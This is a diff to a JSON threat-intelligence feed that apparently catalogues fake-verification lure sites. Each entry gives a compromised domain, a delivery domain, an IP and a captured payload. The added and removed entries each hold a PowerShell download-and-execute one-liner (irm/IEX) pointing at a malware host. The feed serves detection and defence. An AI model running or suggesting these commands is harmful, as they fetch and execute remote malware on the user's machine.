@@ -1,5 +1,27 @@
 [
   {
+    "UrlDomain": "customercross.be",
+    "DeliveryUrl": [
+      "codes-veri.beer"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "195.47.247.18"
+    ],
+    "Related": [
+      {
+        "Value": "https://codes-veri.beer/7df373e3e15b5f53",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'codes-veri.beer/7df373e3e15b5f53'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://codes-veri.beer/7df373e3e15b5f53"
+    ],
+    "ReportId": "cmx0sssfd00140omljarrrimh",
+    "ScannedAt": "2026-11-28T19:23:19.481000+00:00"
+  },
+  {
     "UrlDomain": "www.ctrlsphoto.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -2215,33 +2237,5 @@
     ],
     "ReportId": "cmwwj0nvv000e0omlrzpsql9i",
     "ScannedAt": "2026-11-25T19:38:25.950000+00:00"
-  },
-  {
-    "UrlDomain": "eduxmanager.com.br",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "20.115.232.15"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      },
-      {
-        "Value": "a",
-        "Type": "Hostname"
-      },
-      {
-        "Value": "b",
-        "Type": "Hostname"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/pas-quarenmjn/a1b22db-1028-4ff5-8353-9ef7c7fedbbd/-/raw/main/Ba-761bEc36334D | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/pas-quarenmjn/a1b22db-1028-4ff5-8353-9ef7c7fedbbd/-/raw/main/Ba-761bEc36334D"
-    ],
-    "ReportId": "cmwwhss5u0jtf0nmlt7brl6jz",
-    "ScannedAt": "2026-11-25T19:04:18.623000+00:00"
   }
 ]
